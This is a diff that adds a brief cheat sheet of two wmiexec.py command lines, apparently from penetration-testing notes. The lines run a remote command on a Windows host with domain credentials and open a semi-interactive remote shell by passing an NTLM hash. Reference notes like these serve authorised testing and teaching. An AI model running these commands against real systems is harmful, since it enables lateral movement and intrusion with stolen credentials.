@@ -1,0 +1,6 @@
+# executes single command
+python wmiexec.py <domain>/<user>:<password>@<rhost> <command>
+
+# use hashes and launch semi interactive shell
+python wmiexec.py -hashes <lm:ntlmHash> <domain>/<user>@<rhost> 
+
